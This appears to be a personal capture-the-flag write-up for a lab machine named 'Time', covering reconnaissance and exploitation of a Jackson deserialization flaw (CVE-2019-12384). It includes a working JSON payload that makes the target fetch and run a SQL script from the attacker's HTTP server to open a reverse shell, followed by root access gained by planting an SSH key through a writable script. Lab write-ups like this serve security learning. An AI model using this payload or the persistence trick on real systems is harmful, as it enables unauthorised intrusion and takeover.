# Time

Time

Sunday, 20 February 2022

4:08 pm

This is a Linux machine.

My IP is 10.10.16.9.

The target IP is 10.10.10.214.

&#x20;

Nmap scan up first.

!\[\[45\_Time\_image001.png]]

&#x20;

Let's go view the web page.

!\[\[45\_Time\_image002.png]]

&#x20;

There's this weird page. I ran a quick directory enumeration to make sure I wasn't missing anything.

&#x20;

Directory enumeration revealed this.

!\[\[45\_Time\_image003.png]]

&#x20;

Basically, nothing of interest.

&#x20;

From here, I began to analyse the JS code and wondered what the function of this website actually does. It says JSON so I tried injecting some random JSON stuff.

!\[\[45\_Time\_image004.png]]

Basically, this just returns the JSON in a prettier format. What I'm more interested in is the other function, which is validate.

&#x20;

!\[\[45\_Time\_image005.png]]

&#x20;

Interesting, this returns a code error. We can see that it expects some form of JSON object or something. I took note that there seems to be a com.faster.xml.jackson, and wondered if that's the engine or code that is being used to validate stuff.

&#x20;

So a bit of Googling has led me to believe that this version of the engine is exploitable by stuff, and we can create some payloads and to inject into the web page that would be able to trigger stuff like pings or something. This was based on all

the CVEs I was reading.

&#x20;

I came to the conclusion I had to do [this one.](https://github.com/jas502n/CVE-2019-12384)

&#x20;

Anyways this involved creating a quick .sql file.

&#x20;

{width="13.072916666666666in" height="1.8958333333333333in"}

Get a listener port on port 4444, and host a python http server within the directory this exploit is included in.

&#x20;

\[

"ch.qos.logback.core.db.DriverManagerConnectionSource",

{

"url": "jdbc:h2:mem:;TRACE\_LEVEL\_SYSTEM\_OUT=3;INIT=RUNSCRIPT FROM 'http:\\/\\/10.10.16.9:8000\\/exploit.sql'"

}

]

&#x20;

Inject this into the input for the website under the Validate function. This would then grant us a revere shell.

This vulnerability makes use of the fact that the website does not serialize securely.

&#x20;

!\[\[45\_Time\_image007.png]]

This would work out well.

&#x20;

Time to PE, and I got our linpeas helper on board again.

!\[\[45\_Time\_image008.png]]

&#x20;

We seem to own a script. From here, it's simple child's play.

Just add our public key into authorized keys.

!\[\[45\_Time\_image009.png]]

&#x20;

Again, we can do this only because we own the file. Then just SSH into root.

!\[\[45\_Time\_image0010.png]]

&#x20;
